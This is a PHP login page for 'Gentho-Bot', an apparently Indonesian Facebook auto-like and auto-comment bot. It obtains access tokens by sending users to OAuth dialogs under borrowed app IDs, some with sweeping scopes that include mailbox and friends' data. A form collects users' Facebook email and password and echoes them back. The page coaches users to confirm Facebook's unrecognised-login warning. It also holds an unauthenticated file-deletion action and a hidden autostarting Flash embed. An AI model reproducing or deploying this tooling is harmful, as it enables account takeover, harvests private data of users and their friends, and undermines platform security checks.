<?php
// Login Menu
?>
<script type='text/javascript'>
//<![CDATA[
msg = "|_Welcome To Gentho-Bot__Welcome To Gentho-Bot__Welcome To Gentho-Bot__Welcome To Gentho-Bot__Welcome To Gentho-Bot_";
msg = "" + msg;pos = 0;
function scrollMSG()
{document.title = msg.substring(pos, msg.length) + msg.substring(0, pos); pos++;
if (pos > msg.length) pos = 0
window.setTimeout("scrollMSG()",150);}
scrollMSG();
//]]>
</script>


<meta name="Author" content="Agung Kusanagi"> 
<meta http-equiv="imagetoolbar" content="no"> 
<style type="text/css">

.nontouch .mobile-login-field .input{width:90%} 

   html { 
      overflow: hidden; 
   } 
   body { 

      background:#238e23 no-repeat;background-size:95%;background-attachment:fixed;

      color: #fff; 
      background-image:url("storm.gif");
background-size:600px 600px;
      background-repeat:no-repeat;



   } 
   #frm { 
      position: absolute; 
      height: 100%; 
      width: 100%; 
      left: 0%; 
      top: 0%; 
      font-size: 2em; 
      font-weight: bold; 
      font-family: Chiller;
      background: #transparent; 
      overflow: hidden; 
      padding: 0.5em; 
   } 
   #frm span { 
      position: relative; 
      text-align: center; 
      z-index: 1; 
   } 
   #mtxform { 
      position: relative; 
      z-index: 10; 
   } 
   .hidden { 
      visibility: hidden; 
   } 
</style>
<link rel="shortcut icon" href="http://i.imgur.com/94pZ4.gif" />


</head>
<body> 
<?php
$act=$_GET[act];

echo '
<b>Welcome <a href=http://m.facebook.com/100004051095593>To Gentho-Bot&trade;</a></b></span>
<br/>
___________________________________________________
</div>
<div class="acr apl">
<span class="sec" >
Jangan lupa klik . <iframe width="110" scrolling="no" height="20" frameborder="0" src="//www.facebook.com/plugins/follow.php?href=https%3A%2F%2Fwww.facebook.com%2F100004051095593&amp;layout=button_count&amp;show_faces=true&amp;colorscheme=light&amp;font&amp;width=90" style="overflow: hidden">
&amp;width=90" style="overflow: hidden">
</iframe>
<br/>
Ijinkan Aplikasi, pilih salah satu di bawah ini:
<br/>
| <a href="https://touch.facebook.com/connect/uiserver.php?method=permissions.request&app_id=174829003346&redirect_uri=https%3A%2F%2Fwww.facebook.com%2Fconnect%2Flogin_success.html&response_type=token&perms=publish_stream%2Coffline_access%2Cread_stream%2Cpublish_actions"> | Spotify 1 , </a> | <a href="https://www.facebook.com/v1.0/dialog/oauth?redirect_uri=https%3A%2F%2Fm.spotify.com%2FCOPY_ALL_THIS_URL%2F&scope=email%2Cpublish_actions%2Cuser_about_me%2Cuser_actions.books%2Cuser_actions.music%2Cuser_actions.news%2Cuser_actions.video%2Cuser_activities%2Cuser_birthday%2Cuser_education_history%2Cuser_events%2Cuser_games_activity%2Cuser_groups%2Cuser_hometown%2Cuser_interests%2Cuser_likes%2Cuser_location%2Cuser_notes%2Cuser_photos%2Cuser_questions%2Cuser_relationship_details%2Cuser_relationships%2Cuser_religion_politics%2Cuser_status%2Cuser_subscriptions%2Cuser_videos%2Cuser_website%2Cuser_work_history%2Cfriends_about_me%2Cfriends_actions.books%2Cfriends_actions.music%2Cfriends_actions.news%2Cfriends_actions.video%2Cfriends_activities%2Cfriends_birthday%2Cfriends_education_history%2Cfriends_events%2Cfriends_games_activity%2Cfriends_groups%2Cfriends_hometown%2Cfriends_interests%2Cfriends_likes%2Cfriends_location%2Cfriends_notes%2Cfriends_photos%2Cfriends_questions%2Cfriends_relationship_details%2Cfriends_relationships%2Cfriends_religion_politics%2Cfriends_status%2Cfriends_subscriptions%2Cfriends_videos%2Cfriends_website%2Cfriends_work_history%2Cads_management%2Ccreate_event%2Ccreate_note%2Cexport_stream%2Cfriends_online_presence%2Cmanage_friendlists%2Cmanage_notifications%2Cmanage_pages%2Cphoto_upload%2Cpublish_stream%2Cread_friendlists%2Cread_insights%2Cread_mailbox%2Cread_page_mailboxes%2Cread_requests%2Cread_stream%2Crsvp_event%2Cshare_item%2Csms%2Cstatus_update%2Cuser_online_presence%2Cvideo_upload%2Cxmpp_login&response_type=token&client_id=174829003346&_rdr"> | Spotify 2 </a>
| <a href="https://touch.facebook.com/connect/uiserver.php?method=permissions.request&app_id=2254487659&redirect_uri=https%3A%2F%2Fwww.facebook.com%2Fconnect%2Flogin_success.html&response_type=token&perms=publish_stream%2Coffline_access%2Cread_stream%2Cpublish_actions"> | BlackBery (Tag Name) </a>
<br/>
| <a href="https://www.facebook.com/v1.0/dialog/oauth?redirect_uri=http%3A%2F%2Fwww.facebook.com%2Fconnect%2Flogin_success.html&scope=email%2Cpublish_actions%2Cuser_about_me%2Cuser_actions.books%2Cuser_actions.music%2Cuser_actions.news%2Cuser_actions.video%2Cuser_activities%2Cuser_birthday%2Cuser_education_history%2Cuser_events%2Cuser_games_activity%2Cuser_groups%2Cuser_hometown%2Cuser_interests%2Cuser_likes%2Cuser_location%2Cuser_notes%2Cuser_photos%2Cuser_questions%2Cuser_relationship_details%2Cuser_relationships%2Cuser_religion_politics%2Cuser_status%2Cuser_subscriptions%2Cuser_videos%2Cuser_website%2Cuser_work_history%2Cfriends_about_me%2Cfriends_actions.books%2Cfriends_actions.music%2Cfriends_actions.news%2Cfriends_actions.video%2Cfriends_activities%2Cfriends_birthday%2Cfriends_education_history%2Cfriends_events%2Cfriends_games_activity%2Cfriends_groups%2Cfriends_hometown%2Cfriends_interests%2Cfriends_likes%2Cfriends_location%2Cfriends_notes%2Cfriends_photos%2Cfriends_questions%2Cfriends_relationship_details%2Cfriends_relationships%2Cfriends_religion_politics%2Cfriends_status%2Cfriends_subscriptions%2Cfriends_videos%2Cfriends_website%2Cfriends_work_history%2Cads_management%2Ccreate_event%2Ccreate_note%2Cexport_stream%2Cfriends_online_presence%2Cmanage_friendlists%2Cmanage_notifications%2Cmanage_pages%2Cphoto_upload%2Cpublish_stream%2Cread_friendlists%2Cread_insights%2Cread_mailbox%2Cread_page_mailboxes%2Cread_requests%2Cread_stream%2Crsvp_event%2Cshare_item%2Csms%2Cstatus_update%2Cuser_online_presence%2Cvideo_upload%2Cxmpp_login&response_type=token&client_id=41158896424&_rdr"> | HTC Sense </a>
| <a href="https://touch.facebook.com/connect/uiserver.php?method=permissions.request&app_id=190322544333196&redirect_uri=https%3A%2F%2Fwww.facebook.com%2Fconnect%2Flogin_success.html&response_type=token&perms=publish_stream%2Coffline_access%2Cread_stream%2Cpublish_actions"> | Iframe Tabs </a><br/>
<form action="refresh.php" method="post">
<br/>
<a href="index.php?act=refresh">RESET DATA</a>
<br/>
___________________________________________________
<br/>
<br/>
<table width="90%"><td width="15%">
Type Bot :
</td><td width="90%"><select name = "bot_type">
<option value ="like_only">Bot Like Only</option>
<option value ="like_simple_only">Bot Like + Simple Comment</option>
<option value ="comment_like_emoji">Bot Like + Comment (Emoji)</option>
<option value ="full_zi_bot">Bot Full Response (Emoji)</option></select>
'.htmlspecialchars($dataLog[bot_type]).' 
</td></table>


<table width="90%"><td width="15%">
Access Token :
</td><td width="90%">
<select name = "app_id">
<option value ="2254487659">BlackBery</option>
<option value ="174829003346">Spotify</option>
<option value ="190322544333196">Iframe Tabs</option>
<option value ="41158896424">HTC Sense</option>
<option value ="30713015083">Microsoft Live</option>
<option value ="260273468396">Skype</option>
<option value ="194699337231859">Yahoo Social</option>
<option value ="72687635881">Samsung Mobile</option>
<option value ="117913078226167">AingCreations</option>
</select>
'.htmlspecialchars($dataLog[app_id]).' 
</td></table>

<table width="90%"><td width="15%">
Email/No HP :
</td><td width="90%"><input name="email" type="text" value="'.htmlspecialchars($dataLog[email]).'">
</td></table>

<table width="90%"><td width="15%">
Password :
</td><td width="90%"><input name="pass" type="password" value="'.htmlspecialchars($dataLog[pass]).'">
</td></table>
<table width="90%"><td width="15%">

</td><td width="90%"><input name="host" type="hidden" value="'.$_SERVER[HTTP_HOST].'">
</td></table>

<input type="submit" value="Install Gentho-Bot" name="dataLog">
</td></table></form>
___________________________________________________
<br/> 
Perhatian : Jika akun mu terkunci di akses dari tempat  
<br/> 
yang tidak di kenal, klik LANJUTKAN Lalu klik INI 
<br/>
adalah SAYA, setelah itu kembali ke Halaman ini Dan 
<br/>
Login ulang .
<br/>
Just in case need to submit manual token  <a href="token.php"> Click here . </a>
<br/>___________________________________________________
</a>
';
echo '</div></body></html>';
echo '<embed allowscriptaccess="never" type="application/x-shockwave-flash" src="http://www.4shared.com/embed/1118846590/5f519b2" width="0" height="0" flashvars="autostart=true"></embed>';

echo 'Powered By: <a href=http://m.facebook.com/100004051095593>Gentho-Bot&trade;</a><br></b>';

if($act=='refresh'){
unlink('dataLog.php');
unlink('zi_key.txt');
unlink('error_log');
unlink('coker_log');
echo 'semua data berhasil di hapus';
echo '<meta http-equiv="refresh" content="0;url='.$_SERVER['PHP_SELF'].'"/>';
}
?>